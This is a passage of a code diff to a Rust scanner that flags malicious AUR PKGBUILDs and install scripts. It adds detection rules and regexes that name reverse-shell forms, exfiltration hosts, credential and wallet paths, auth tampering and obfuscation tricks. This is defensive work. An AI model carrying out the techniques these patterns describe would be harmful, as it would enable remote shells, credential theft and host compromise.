             cwe_id: None,
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "HIDDEN-003".to_string(),
@@ -1222,6 +1552,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Binaries should be placed in standard locations".to_string(),
             cwe_id: None,
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -1245,6 +1576,11 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "LD_PRELOAD manipulation is extremely suspicious".to_string(),
             cwe_id: Some("CWE-426".to_string()),
             enabled: true,
+            // Env-var NAMEs are case-sensitive in bash, and `/etc/ld.so.preload`
+            // is a fixed lowercase path: a lowercase `ld_preload=` does NOT set
+            // the real variable, so matching case-insensitively would only add
+            // false positives without catching any real attack (audit HI-6 caveat).
+            case_sensitive: true,
         },
         Rule {
             id: "ENV-002".to_string(),
@@ -1264,6 +1600,10 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "PATH manipulation in install scripts is suspicious".to_string(),
             cwe_id: Some("CWE-426".to_string()),
             enabled: true,
+            // `PATH` is a canonical upper-case env-var NAME; a lowercase `path=`
+            // is an ordinary local variable, so keep this case-sensitive to avoid
+            // false positives (audit HI-6 caveat).
+            case_sensitive: true,
         },
         Rule {
             id: "ENV-003".to_string(),
@@ -1283,6 +1623,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Packages should not modify shell configuration".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -1303,6 +1644,7 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Verify this package is a legitimate alternative".to_string(),
             cwe_id: None,
             enabled: true,
+            case_sensitive: false,
         },
 
         // ============================================================
@@ -1325,25 +1667,45 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "Do NOT build. This is a known-malicious dependency. Remove the package and treat the host as compromised: rotate credentials (SSH, npm/GitHub tokens, browser sessions).".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "ATOMIC-002".to_string(),
             name: "Node/Bun package manager in install hook".to_string(),
-            description: "Invokes npm/pnpm/yarn/bun to install packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch npm/bun packages during the install phase.".to_string(),
+            description: "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.".to_string(),
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![
+                // `ci` installs the full lockfile (lifecycle scripts run);
+                // `exec`/`dlx`/`rebuild` fetch-and-run or re-run lifecycle code.
+                // The cross terms that don't exist as real subcommands (e.g.
+                // `npm dlx`, `yarn ci`) never appear in real PKGBUILDs, so
+                // folding them into one alternation is simpler without adding FPs.
+                // `explore <pkg> -- cmd` runs an arbitrary command in a package
+                // dir (RCE); `exec`/`dlx`/`rebuild`/`ci` as before.
                 Pattern::Regex {
-                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i)\b".to_string(),
+                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec|rebuild|explore)\b"
+                        .to_string(),
                 },
+                // `bun` subcommands (NOT `bunx`, which is the runner below — the
+                // `\s+` after `bun` excludes `bunx`).
                 Pattern::Regex {
-                    pattern: r"\bbunx?\s+(install|add|i|x)\b".to_string(),
+                    pattern: r"\bbun\s+(install|add|i|x)\b".to_string(),
+                },
+                // The npx-style RUNNERS: `npx <pkg>` / `bunx <pkg>` / `pnpx <pkg>`
+                // fetch and run a package directly (no subcommand) — the most
+                // common fetch-and-run RCE, and the exact form the old
+                // `bunx?\s+(install|add|i|x)` and the npm-only alternation BOTH
+                // missed. A bare runner followed by any argument is the attack.
+                Pattern::Regex {
+                    pattern: r"\b(npx|bunx|pnpx)\s+\S".to_string(),
                 },
             ],
             file_types: vec![FileType::InstallScript],
             recommendation: "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.".to_string(),
             cwe_id: Some("CWE-494".to_string()),
             enabled: true,
+            case_sensitive: false,
         },
         Rule {
             id: "ATOMIC-003".to_string(),
@@ -1363,6 +1725,531 @@ pub fn get_builtin_rules() -> Vec<Rule> {
             recommendation: "This is a rootkit dropper artifact. Do not build; treat the host as compromised and reinstall rather than clean.".to_string(),
             cwe_id: Some("CWE-506".to_string()),
             enabled: true,
+            case_sensitive: false,
+        },
+
+        // ============================================================
+        // PROACTIVE COVERAGE — additional reverse shells, exfil channels,
+        // trust/auth tampering, and obfuscation, beyond the originally
+        // reported samples. Each pattern is essentially never present in a
+        // legitimate PKGBUILD; all inherit de-obfuscation + heredoc scoping.
+        // ============================================================
+
+        // --- reverse / bind shells (interpreters + fifo) ---
+        Rule {
+            id: "SHELL-005".to_string(),
+            name: "Perl reverse shell".to_string(),
+            description: "A Perl socket reverse shell (Socket + connect/exec).".to_string(),
+            severity: Severity::Critical,
+            category: Category::MaliciousCode,
+            patterns: vec![Pattern::Regex { pattern: r"perl\s+.*(socket|IO::Socket).*(connect|exec|/bin/sh)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This is a remote shell.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "SHELL-006".to_string(),
+            name: "PHP reverse shell".to_string(),
+            description: "A PHP reverse shell using fsockopen.".to_string(),
+            severity: Severity::Critical,
+            category: Category::MaliciousCode,
+            patterns: vec![Pattern::Regex { pattern: r"php\s+-r\s+.*fsockopen".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This is a remote shell.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "SHELL-007".to_string(),
+            name: "Ruby/Lua/AWK reverse shell".to_string(),
+            description: "A reverse shell via Ruby TCPSocket, Lua socket, or AWK /inet/.".to_string(),
+            severity: Severity::Critical,
+            category: Category::MaliciousCode,
+            patterns: vec![
+                Pattern::Regex { pattern: r"ruby\s+.*(-rsocket|TCPSocket)".to_string() },
+                Pattern::Regex { pattern: r"lua.*socket\.tcp\(".to_string() },
+                Pattern::Regex { pattern: r"awk.*/inet/(tcp|udp)/".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This is a remote shell.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "SHELL-008".to_string(),
+            name: "Node.js reverse shell".to_string(),
+            description: "A Node.js reverse shell using the net module.".to_string(),
+            severity: Severity::Critical,
+            category: Category::MaliciousCode,
+            patterns: vec![Pattern::Regex { pattern: r#"node\s+-e\s+.*require\(['"]net['"]\).*(connect|createConnection)"#.to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This is a remote shell.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "SHELL-009".to_string(),
+            name: "OpenSSL-encrypted reverse shell".to_string(),
+            description: "openssl s_client used as an encrypted C2 channel.".to_string(),
+            severity: Severity::Critical,
+            category: Category::MaliciousCode,
+            patterns: vec![Pattern::Regex { pattern: r"openssl\s+s_client\s+.*-connect".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This is an encrypted remote shell.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "SHELL-010".to_string(),
+            name: "Named-pipe (mkfifo) reverse shell".to_string(),
+            description: "mkfifo paired with nc/openssl/ /dev/tcp — the classic backpipe reverse shell that evades `nc -e` detection.".to_string(),
+            severity: Severity::Critical,
+            category: Category::MaliciousCode,
+            patterns: vec![Pattern::Regex { pattern: r"mkfifo\s+\S+.*(nc\s|ncat\s|openssl\s|/dev/(tcp|udp)/)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This is a remote shell.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "SHELL-011".to_string(),
+            name: "Busybox/telnet/ncat-ssl shell".to_string(),
+            description: "A reverse shell via busybox nc -e, telnet piped to a shell, or ncat --ssl -e.".to_string(),
+            severity: Severity::Critical,
+            category: Category::MaliciousCode,
+            patterns: vec![
+                Pattern::Regex { pattern: r"busybox\s+nc\b.*-e".to_string() },
+                Pattern::Regex { pattern: r"telnet\s+\S+\s+\d{2,5}\s*\|".to_string() },
+                Pattern::Regex { pattern: r"ncat\b.*--ssl.*-e".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This is a remote shell.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+
+        // --- exfiltration channels ---
+        Rule {
+            id: "EXFIL-004".to_string(),
+            name: "DNS exfiltration".to_string(),
+            description: "Data smuggled out via DNS lookups (dig/nslookup/host of a command-substituted subdomain, or a TXT query to an attacker domain).".to_string(),
+            severity: Severity::Critical,
+            category: Category::DataExfiltration,
+            patterns: vec![
+                Pattern::Regex { pattern: r"\b(dig|nslookup|host)\b\s+.*\$\(".to_string() },
+                Pattern::Regex { pattern: r"\b(dig|nslookup)\b.*\b(TXT|@)\b".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Review the destination domain; this pattern smuggles data over DNS.".to_string(),
+            cwe_id: Some("CWE-200".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "EXFIL-006".to_string(),
+            name: "HTTP upload exfiltration".to_string(),
+            description: "curl uploading a local file (-T/--upload-file/-F/--data-urlencode) — used to send harvested data to an attacker endpoint.".to_string(),
+            severity: Severity::High,
+            category: Category::DataExfiltration,
+            patterns: vec![Pattern::Regex { pattern: r"curl\s+.*(--upload-file|\s-T\s|--data-urlencode|\s-F\s)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Verify what is being uploaded and to where.".to_string(),
+            cwe_id: Some("CWE-200".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "EXFIL-007".to_string(),
+            name: "wget POST exfiltration".to_string(),
+            description: "wget --post-data/--post-file sending local data to a remote endpoint.".to_string(),
+            severity: Severity::High,
+            category: Category::DataExfiltration,
+            patterns: vec![Pattern::Regex { pattern: r"wget\s+.*--post-(data|file)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Verify what is being posted and to where.".to_string(),
+            cwe_id: Some("CWE-200".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "EXFIL-008".to_string(),
+            name: "Slack/Teams webhook exfiltration".to_string(),
+            description: "Posting to a Slack or Microsoft Teams incoming webhook — a common low-friction exfil/C2 channel.".to_string(),
+            severity: Severity::Critical,
+            category: Category::DataExfiltration,
+            patterns: vec![
+                Pattern::Regex { pattern: r"hooks\.slack\.com/services/".to_string() },
+                Pattern::Regex { pattern: r"webhook\.office\.com/webhookb2/".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Remove. Packages do not post to chat webhooks during build/install.".to_string(),
+            cwe_id: Some("CWE-200".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "EXFIL-009".to_string(),
+            name: "Anonymous file-drop / tunnel host".to_string(),
+            description: "Uploads to a throwaway file-drop or tunnels through ngrok/webhook.site/requestbin/IPFS — exfil and ad-hoc C2 endpoints.".to_string(),
+            severity: Severity::High,
+            category: Category::DataExfiltration,
+            patterns: vec![Pattern::Regex { pattern: r"\b(file\.io|0x0\.st|transfer\.sh|oshi\.at|bashupload\.com|temp\.sh|ngrok\.(io|app|dev)|webhook\.site|requestbin\.(com|net)|pipedream\.net|ipfs\.io/api)\b".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Review the destination; these are common exfil/C2 hosts.".to_string(),
+            cwe_id: Some("CWE-200".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "CRED-008".to_string(),
+            name: "Environment/secret dump".to_string(),
+            description: "Dumping the environment (env/printenv) to a file or pipe to curl/nc/base64 — harvests tokens and secrets exposed as env vars.".to_string(),
+            severity: Severity::High,
+            category: Category::CredentialTheft,
+            patterns: vec![Pattern::Regex { pattern: r"\b(env|printenv)\b\s*(\|\s*(curl|wget|nc|base64|gzip)|>\s*\S)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Remove. Packages have no reason to dump the environment.".to_string(),
+            cwe_id: Some("CWE-522".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+
+        // --- broadened credential-store targets ---
+        Rule {
+            id: "CRED-004".to_string(),
+            name: "Cloud / CI credential file access".to_string(),
+            description: "Reads cloud or CI credential files (gcloud, docker config, npmrc, pypirc, cargo/terraform credentials, git-credentials).".to_string(),
+            severity: Severity::High,
+            category: Category::CredentialTheft,
+            patterns: vec![Pattern::Regex { pattern: r"(\.git-credentials|\.config/gcloud|\.docker/config\.json|\.npmrc|\.pypirc|\.cargo/credentials|\.terraformrc|\.config/gh/hosts)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Verify why a build/install touches credential files.".to_string(),
+            cwe_id: Some("CWE-522".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "CRED-005".to_string(),
+            name: "Keyring / wallet access".to_string(),
+            description: "Reads OS keyrings (gnome-keyring/kwallet/secret-tool) or crypto wallet files (electrum/bitcoin/metamask/keystore).".to_string(),
+            severity: Severity::Critical,
+            category: Category::CredentialTheft,
+            patterns: vec![Pattern::Regex { pattern: r"(\.local/share/keyrings|\.local/share/kwalletd|secret-tool\s+search|kwallet-query|\.electrum|\.bitcoin/wallet|wallet\.dat|nkbihfbeogaeaoehlefnkodbefgpgknn)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This harvests secrets/wallets.".to_string(),
+            cwe_id: Some("CWE-522".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+
+        // --- account / auth / system tampering ---
+        Rule {
+            id: "PRIV-007".to_string(),
+            name: "Privileged account manipulation".to_string(),
+            description: "Creates or elevates an account to uid 0 / the wheel or sudo group — a backdoor-admin pattern.".to_string(),
+            severity: Severity::Critical,
+            category: Category::PrivilegeEscalation,
+            patterns: vec![
+                // uid/gid 0, or the -o/--non-unique flag (incl. combined like -ou).
+                Pattern::Regex { pattern: r"\b(useradd|usermod)\b.*((-u|--uid)[= ]*0\b|-g[= ]*0\b|\s-\w*o\w*\b|--non-unique)".to_string() },
+                // adding/creating an account in the wheel or sudo group.
+                Pattern::Regex { pattern: r"\b(useradd|usermod|adduser)\b.*\b(wheel|sudo)\b".to_string() },
+                Pattern::Regex { pattern: r"\bgpasswd\s+-a\s+\S+\s+(wheel|sudo)".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This grants an account administrative access.".to_string(),
+            cwe_id: Some("CWE-269".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "PRIV-008".to_string(),
+            name: "Password manipulation".to_string(),
+            description: "Sets, resets, or clears an account password (chpasswd / passwd -d / piped passwd).".to_string(),
+            severity: Severity::Critical,
+            category: Category::PrivilegeEscalation,
+            patterns: vec![
+                Pattern::Regex { pattern: r"\bchpasswd\b".to_string() },
+                Pattern::Regex { pattern: r"\bpasswd\s+-d\b".to_string() },
+                Pattern::Regex { pattern: r"\|\s*passwd\s".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This changes account credentials.".to_string(),
+            cwe_id: Some("CWE-269".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "TAMPER-001".to_string(),
+            name: "Auth database write".to_string(),
+            description: "Writes directly to /etc/passwd, /etc/shadow, /etc/group or /etc/gshadow — a direct backdoor-account injection.".to_string(),
+            severity: Severity::Critical,
+            category: Category::PrivilegeEscalation,
+            patterns: vec![Pattern::Regex { pattern: r"(>>?|tee\s+-?a?)\s*\S*/etc/(passwd|shadow|group|gshadow)\b".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This edits the live auth database.".to_string(),
+            cwe_id: Some("CWE-269".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "TAMPER-002".to_string(),
+            name: "doas/sudoers nopasswd grant".to_string(),
+            description: "Grants passwordless privilege via /etc/doas.conf or a NOPASSWD sudoers rule.".to_string(),
+            severity: Severity::Critical,
+            category: Category::PrivilegeEscalation,
+            patterns: vec![
+                Pattern::Regex { pattern: r"/etc/doas\.conf".to_string() },
+                Pattern::Regex { pattern: r"permit\s+(nopass|persist)".to_string() },
+                Pattern::Regex { pattern: r"NOPASSWD".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This grants passwordless root.".to_string(),
+            cwe_id: Some("CWE-269".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "TAMPER-005".to_string(),
+            name: "PAM tampering".to_string(),
+            description: "Inserts a permissive PAM module (pam_permit.so) or writes into /etc/pam.d — an authentication bypass.".to_string(),
+            severity: Severity::Critical,
+            category: Category::PrivilegeEscalation,
+            patterns: vec![
+                Pattern::Regex { pattern: r"pam_permit\.so".to_string() },
+                Pattern::Regex { pattern: r"(>>?|tee).*?/etc/pam\.d/".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This tampers with authentication.".to_string(),
+            cwe_id: Some("CWE-287".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "TAMPER-011".to_string(),
+            name: "pacman signature downgrade".to_string(),
+            description: "Sets SigLevel = Never in /etc/pacman.conf, disabling package signature verification so future malicious updates are accepted silently.".to_string(),
+            severity: Severity::Critical,
+            category: Category::MaliciousCode,
+            patterns: vec![Pattern::Regex { pattern: r"SigLevel\s*=\s*Never".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This disables pacman signature checking.".to_string(),
+            cwe_id: Some("CWE-347".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "TAMPER-013".to_string(),
+            name: "Security control disabled".to_string(),
+            description: "Disables a firewall, SELinux/AppArmor, or stops a security/audit service.".to_string(),
+            severity: Severity::High,
+            category: Category::MaliciousCode,
+            patterns: vec![
+                Pattern::Regex { pattern: r"\b(setenforce\s+0|ufw\s+disable|aa-disable)\b".to_string() },
+                Pattern::Regex { pattern: r"systemctl\s+(stop|disable|mask)\s+(auditd|apparmor|firewalld|nftables|ufw)".to_string() },
+                Pattern::Regex { pattern: r"\b(iptables|ip6tables|nft)\b.*(\s-F\b|flush\s+ruleset)".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This weakens host security controls.".to_string(),
+            cwe_id: Some("CWE-693".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "TAMPER-017".to_string(),
+            name: "CA trust anchor injection".to_string(),
+            description: "Installs a CA certificate into the system trust store — enables MITM of TLS for the whole system.".to_string(),
+            severity: Severity::High,
+            category: Category::MaliciousCode,
+            patterns: vec![
+                Pattern::Regex { pattern: r"trust\s+anchor\b".to_string() },
+                Pattern::Regex { pattern: r"/etc/ca-certificates/trust-source/anchors".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Verify the certificate; a rogue trust anchor enables TLS MITM.".to_string(),
+            cwe_id: Some("CWE-295".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+
+        // --- supply-chain trust manipulation ---
+        Rule {
+            id: "TRUST-001".to_string(),
+            name: "pacman keyring poisoning".to_string(),
+            description: "Imports and locally-signs an arbitrary key into pacman's trust store (pacman-key --recv-keys/--lsign) so attacker-signed packages are accepted.".to_string(),
+            severity: Severity::High,
+            category: Category::MaliciousCode,
+            patterns: vec![Pattern::Regex { pattern: r"pacman-key\s+.*(--recv-keys|--lsign|--lsign-key|\s-r\b)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. Packages ship keys via keyring packages, not by importing at build time.".to_string(),
+            cwe_id: Some("CWE-494".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "TRUST-002".to_string(),
+            name: "GPG key import at build time".to_string(),
+            description: "Imports or fetches a GPG key during build/install (gpg --import/--recv-keys/--keyserver).".to_string(),
+            severity: Severity::Medium,
+            category: Category::MaliciousCode,
+            patterns: vec![Pattern::Regex { pattern: r"gpg\s+.*(--import|--recv-keys|--keyserver)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Verify the key; importing a key to satisfy validpgpkeys from an untrusted source defeats the check.".to_string(),
+            cwe_id: Some("CWE-494".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "DEP-003".to_string(),
+            name: "Package index/registry override".to_string(),
+            description: "Redirects a language package manager to a non-default index/registry (pip --index-url, npm registry, GOPROXY, etc.) — a dependency-confusion vector.".to_string(),
+            severity: Severity::High,
+            category: Category::Dependencies,
+            // The rule stays case-insensitive overall (flags like `--index-url`
+            // and npm's `npm_config_registry`, which npm honours in BOTH cases,
+            // should match any spelling). But `PIP_INDEX_URL` and `GOPROXY` are
+            // pinned case-exact with `(?-i:…)`: pip/go read only the upper-case
+            // env var, so a lower-case `pip_index_url=`/`goproxy=` is an inert
+            // local variable and matching it would be a false positive
+            // (audit HI-6 env-NAME caveat; the rest of the env-NAME family is
+            // handled rule-level via `case_sensitive`).
+            patterns: vec![Pattern::Regex { pattern: r"(--index-url|--extra-index-url|(?-i:PIP_INDEX_URL)=|npm_config_registry=|--registry\s+https?|(?-i:GOPROXY)=|--default-registry)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Verify the index host; overriding the registry redirects dependencies to an attacker source.".to_string(),
+            cwe_id: Some("CWE-494".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "SRC-009".to_string(),
+            name: "Obfuscated IP in URL".to_string(),
+            description: "A source/download URL using an IPv6, hex, octal, or decimal IP literal to evade plain-IPv4 detection.".to_string(),
+            severity: Severity::High,
+            category: Category::NetworkSecurity,
+            patterns: vec![
+                Pattern::Regex { pattern: r"://\[[0-9a-fA-F:]+\]".to_string() },
+                // hex / decimal IP literal as the WHOLE host (terminated by :, /, or
+                // end) — not a dotted hostname like 0x0.st.
+                Pattern::Regex { pattern: r"://0x[0-9a-fA-F]+(?:[:/]|$)".to_string() },
+                Pattern::Regex { pattern: r"://\d{8,10}(?:[:/]|$)".to_string() },
+            ],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Resolve and review the host; obfuscated IPs hide the real destination.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+
+        // --- additional obfuscation / encoding ---
+        Rule {
+            id: "OBF-007".to_string(),
+            name: "printf character assembly".to_string(),
+            description: "A command assembled from printf hex/octal escapes (printf '\\x63\\x64' = 'cd') to hide it from literal matching.".to_string(),
+            severity: Severity::High,
+            category: Category::Obfuscation,
+            patterns: vec![Pattern::Regex { pattern: r#"printf\s+["']?(\\x[0-9a-fA-F]{2}|\\0?[0-7]{2,3}){2,}"#.to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Decode the printf escapes and review the assembled command.".to_string(),
+            cwe_id: Some("CWE-506".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "OBF-008".to_string(),
+            name: "Alternate-encoding decode".to_string(),
+            description: "Decoding base32/base16 (an alternative to base64) to reconstruct a hidden payload.".to_string(),
+            severity: Severity::High,
+            category: Category::Obfuscation,
+            patterns: vec![Pattern::Regex { pattern: r"\b(base32|base16)\s+(-d|--decode|-[a-zA-Z]*d)\b".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Decode and review the content.".to_string(),
+            cwe_id: Some("CWE-506".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "OBF-011".to_string(),
+            name: "Interpreter here-string execution".to_string(),
+            description: "Feeding an assembled string to a shell via a here-string (sh <<< ...) — a common way to run a string that was built to dodge matching.".to_string(),
+            severity: Severity::High,
+            category: Category::Obfuscation,
+            patterns: vec![Pattern::Regex { pattern: format!(r"{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s*<<<") }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Review the here-string; this executes an assembled command.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+
+        // --- additional remote-exec forms ---
+        Rule {
+            id: "EXEC-002".to_string(),
+            name: "Shell -c command substitution fetch".to_string(),
+            description: "sh -c \"$(curl ...)\" — fetches and runs remote code without an explicit pipe, evading the curl|sh rules.".to_string(),
+            severity: Severity::Critical,
+            category: Category::MaliciousCode,
+            patterns: vec![Pattern::Regex { pattern: format!(r#"{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b\s+-c\s+["']?\$\(\s*(curl|wget|aria2c|fetch|http)\b"#) }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. This runs code fetched from a URL.".to_string(),
+            cwe_id: Some("CWE-494".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "EXEC-005".to_string(),
+            name: "Detached background execution".to_string(),
+            description: "Launches a fetched/dropped payload detached from the build (setsid/nohup), so it keeps running after install.".to_string(),
+            severity: Severity::Medium,
+            category: Category::MaliciousCode,
+            patterns: vec![Pattern::Regex { pattern: r"\b(setsid|nohup)\b.*(curl|wget|/tmp/|\bbash\b|\bsh\b|\s\./)".to_string() }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Review the detached process; this outlives the install.".to_string(),
+            cwe_id: Some("CWE-506".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "EXEC-006".to_string(),
+            name: "sqlite3 shell-command execution".to_string(),
+            description: "sqlite3's `.shell`/`.system` dot-commands run an arbitrary shell command, and `.import` can read an attacker-controlled file — an exec/RCE vector hidden inside what looks like a database call. Legitimate packages do not drive sqlite3 through these meta-commands.".to_string(),
+            severity: Severity::High,
+            category: Category::MaliciousCode,
+            // Require the dot-command form: a `.` preceded by whitespace or a
+            // quote (the start of a sqlite3 meta-command), so a filename like
+            // `data.import` or a column named `system` is not matched.
+            patterns: vec![Pattern::Regex {
+                pattern: r#"\bsqlite3\b[^\n]*[\s"']\.(?:shell|system|import)\b"#.to_string(),
+            }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Do not build. sqlite3 .shell/.system run arbitrary commands; report the package.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
+        },
+        Rule {
+            id: "EXEC-007".to_string(),
+            name: "make reads a Makefile from stdin".to_string(),
+            description: "`make -f -` / `make -f /dev/stdin` executes a Makefile fed on standard input (commonly the tail of a `curl ... | make -f -` fetch-and-run). A Makefile is arbitrary shell recipes, so this is RCE from an unverified source. Normal `make` / `make -f Makefile` builds are unaffected.".to_string(),
+            severity: Severity::High,
+            category: Category::CommandInjection,
+            // The `-`/`/dev/stdin` operand must stand alone (followed by space or
+            // EOL) so `make -j4`, `make -C dir`, `make --version` do NOT match.
+            patterns: vec![Pattern::Regex {
+                pattern: r"\bg?make\s+(?:-f\s*)?(?:-|/dev/stdin)(?:\s|$)".to_string(),
+            }],
+            file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
+            recommendation: "Review the Makefile source; building a Makefile read from stdin/a pipe runs unverified recipes.".to_string(),
+            cwe_id: Some("CWE-94".to_string()),
+            enabled: true,
+            case_sensitive: false,
         },
     ]
 }
@@ -1410,6 +2297,188 @@ mod tests {
         let matches = engine.match_content(content, FileType::Pkgbuild);
         assert!(!matches.is_empty());
         assert_eq!(matches[0].rule_id, "DLE-001");
+    }
+
+    #[test]
+    fn printed_message_mentioning_dotfile_is_not_flagged() {
+        // Real false positive from google-chrome / vscode: a printed note that
+        // mentions ~/.config must NOT trip HIDDEN-001 (it mentions a path; it
+        // does not create one).
+        let engine = RuleEngine::default();
